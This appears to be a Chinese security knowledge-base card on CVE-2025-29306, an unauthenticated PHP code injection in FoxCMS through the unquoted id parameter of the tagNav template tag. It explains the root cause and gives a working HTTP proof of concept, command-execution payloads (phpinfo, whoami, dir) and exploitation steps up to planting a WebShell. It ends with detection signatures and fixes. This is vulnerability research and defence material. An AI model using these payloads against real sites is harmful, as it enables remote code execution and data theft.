---
id: web-php-rce-foxcms-taglib-id-code-injection
title: FoxCMS 模板标签 id 参数拼接进编译模板导致 PHP 代码执行
type: scenario
domain: web
path: web/php/rce
technique: foxcms-taglib-param-code-injection
tags:
- php
- foxcms
- cms
- thinkphp
- template-injection
- taglib
- rce
- cve-2025-29306
cve:
- CVE-2025-29306
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: V1.2、V1.2.5
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T02:03:25+08:00'
  notes: 已对照原文与28张图核对：入口 app/home/controller/Images.php index() 调 View::fetch→think View/Think/Template::fetch→compiler→parse→parseTagLib('fox')→Fox::tagNav；tagNav 中 $id=\request()->param('id')，!empty($currentstyle)&&!empty($id) 时把 $id 未加引号拼进 $parse（图24/25 源码），编译缓存执行后 PHP 求值；图03/05-06/11/14/27/28 实测 phpinfo、calc、whoami 回显，图26 一次请求 6 次 true 与重复执行对应，删除 id 后不执行(图28)。CVE-2025-29306 与影响版本 V1.2/V1.2.5 与原文一致，卡片已设置 affected_versions。未在本机复现；无 sources/source_url。
url: /docs/web/php/rce/web-php-rce-foxcms-taglib-id-code-injection/
draft: false
kb_aliases:
- CVE-2025-29306
- FoxCMS 黔狐内容管理系统 RCE
- FOXCMS /images/index.html 代码执行
- FoxCMS tagNav 参数注入
- ThinkPHP 自定义标签库代码注入
---

## 一句话结论

FoxCMS 的自定义模板标签 `tagNav` 把请求参数 `id` 不做引号包裹直接拼进模板编译产物，访问 `/images/index.html?id=${@print(phpinfo())}` 即可在模板缓存文件被 include 时执行任意 PHP 代码，属于未授权远程代码执行。

## 原理

- 入口在 `app/home/controller/Images.php` 的 `index()`：它根据页面配置确定模板名后调用 ThinkPHP 的 `View::fetch($template)`，模板编译流程为 `think\View::fetch` → `think\view\driver\Think::fetch` → `think\template\Template::fetch` → `compiler()` → `parse()`。
- `parse()` 在 `taglib_pre_load`/内置标签库阶段对模板做标签解析，`parseTagLib()` 反射实例化标签库类（本场景为 `app\taglib\Fox`）并调用 `parseTag()`。
- `Fox::tagNav()` 中执行 `$id = \request()->param("id");`，随后当 `!empty($currentstyle) && !empty($id)` 成立时，把 `$id` 原样拼进将要写入缓存文件的 PHP 源码，例如 `navAddField($_LIST_, <id>, '<currentstyle>', '<at>')`。这里 `$id` 既没有加引号也没有做数字校验，于是请求值直接成为模板中的 PHP 表达式。
- 编译结果写入 `runtime` 下的模板缓存文件（`$cacheFile`），随后由 `$this->storage->read($cacheFile, $this->data)` 读取并执行，注入的表达式随之被 PHP 求值。
- 载荷 `${@print(phpinfo())}` 之所以成立，是因为 PHP 的 `${expr}` 变量变量语法会对花括号内的表达式求值；把命令放进反引号（如 `${@print(`whoami`)}`）则在求值时触发命令执行。
- 该模板编译缓存默认未启用（无 `cache_id`），每次请求都会重新编译并执行，因此无需等待缓存失效；同一模板中多个导航标签都满足条件时，载荷在一次请求内会被执行多次（原文实测 6 次）。

## 触发条件

- 目标为 FoxCMS V1.2 或 V1.2.5，且 `/images/index.html` 路由可访问（无需登录）；
- 当前模板的导航标签带有 `currentstyle` 属性（默认模板满足），使得 `!empty($currentstyle) && !empty($id)` 成立；
- PHP 未禁用 `print`、反引号/system 类操作；`id` 参数可在 URL 查询串中传入。

## 利用步骤

1. 确认目标为 FoxCMS：访问首页/静态资源路径，观察 `foxcms` 特征与 `/images/index.html` 是否返回正常页面。
2. 用 `phpinfo()` 载荷验证代码执行：`GET /images/index.html?id=%24%7B%40print(phpinfo())%7D`，页面出现 phpinfo 即成功。
3. 用反引号执行系统命令并回显，例如 `id=%24%7B%40print(%60whoami%60)%7D`。
4. 按需读取配置文件（数据库账号）、写入 WebShell 或建立回连，再以 Web 进程权限横向。
5. 若 `print` 被过滤，可换 `echo`、`var_dump`、`system`、`passthru` 等可用表达式，注意 URL 编码与模板缓存的重复执行。

## PoC

```http
GET /images/index.html?id=%24%7B%40print(phpinfo())%7D HTTP/1.1
Host: target
```

解码后的 `id` 为 `${@print(phpinfo())}`；命令执行变体：

```text
id=${@print(`whoami`)}
id=${@print(`dir C:\`)}
```

## 变体与关联

- 同一标签库中其它把 `request()->param()` 结果直接拼进 `$parse` 字符串的标签方法，存在同样的代码注入面；审计时应搜索标签库内 `$parse .=` 与 request 取值拼接的位置。
- 由于底层是 ThinkPHP 模板编译，其它使用自定义 taglib 且在编译期拼接请求参数的 ThinkPHP 应用可复用同一思路。
- 关联：[[web-php-rce-seacms-search-template-code-execution]]（CMS 模板解析导致的代码执行）；[[web-php-file-inclusion-thinkphp-view-template]]（ThinkPHP 模板/包含链）。
- 影响边界：无需认证即可执行任意 PHP 代码；是否进一步命令执行取决于 `disable_functions` 与 Web 进程权限。

## 检测与防御

- 检测：访问日志中出现对 `/images/index.html` 且 `id` 含 `%24%7B`、`${`、`@print`、反引号等特征的请求；同一请求内 phpinfo 输出或重复命令回显；`runtime` 模板缓存目录中出现含请求内容的 PHP 文件；PHP 进程派生 `whoami`、`dir` 等子进程。
- 修复：升级 FoxCMS 至修复版本；`tagNav()` 等标签方法对 `id` 做严格数字/白名单校验，拼接进 PHP 源码前必须加引号并转义，禁止把请求参数直接写入模板编译结果。
- 缓解：WAF 拦截 `id` 参数中的 `${`、`@print`、反引号及 `phpinfo` 等特征；PHP `disable_functions` 禁用命令执行函数；Web 进程降权，限制 `runtime` 目录可写范围与模板缓存执行权限。
